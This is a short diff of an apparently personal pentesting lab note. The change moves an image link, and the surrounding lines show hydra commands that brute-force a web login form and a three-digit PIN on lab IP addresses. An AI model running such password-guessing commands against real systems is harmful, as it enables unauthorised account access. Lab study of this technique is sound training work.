@@ -46,7 +46,7 @@ hydra -l <username> -P <wordlist> 10.10.181.239 http-post-form "/:username=^USER
 - The provided passwords will be replacing `^PASS^`
 - Finally, `F=incorrect` is a string that appears in the server reply when the login fails
 ---
-![Pasted image 20231206174317.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020231206174317.png)
+![Pasted image 20231206174317.png](/img/user/attachments/Pasted%20image%2020231206174317.png)
 ```sh
 hydra -l '' -P 3digits.txt -f -v 10.10.180.149 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
 ```
